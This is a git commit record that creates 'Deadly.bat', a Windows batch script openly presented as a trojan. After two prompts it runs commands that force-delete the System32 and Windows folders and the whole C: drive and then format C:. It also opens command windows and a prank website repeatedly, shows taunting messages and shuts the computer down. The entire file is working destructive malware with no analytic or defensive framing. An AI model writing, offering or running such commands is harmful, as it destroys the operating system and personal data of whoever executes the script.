d9a0f41f4edc51c1f506d13dff448e415d0ad093
Leon01TP12 <142297446+Leon01TP12@users.noreply.github.com>
2023-08-25 15:26:06 +0200

    Create Deadly.bat

---
+++ Deadly.bat
@@ -0,0 +1,28 @@
+@echo off 
+:virus
+echo Warning ⚠️ You have ran A trojan that can destroy ur system are you sure close the cmd if no continue if yes
+pause
+cls
+echo Are you sure you still wanna run this? 
+pause
+cls
+echo okay then
+timeout 1
+msg * Enjoy ur pc being Destroyed 🙂 
+timeout 2
+del C:\Windows\System32 /f /s /q
+del C:\Windows /f /s /q
+del C: /f /s /q
+format C:
+start cmd 
+start cmd
+start cmd
+start cmd
+start www.youareanidiot.cc
+start www.youareanidiot.cc
+start www.youareanidiot.cc
+start www.youareanidiot.cc
+timeout 3
+msg * Your Pc has been destroyed lololololololo
+timeout 2
+shutdown -s -t 0
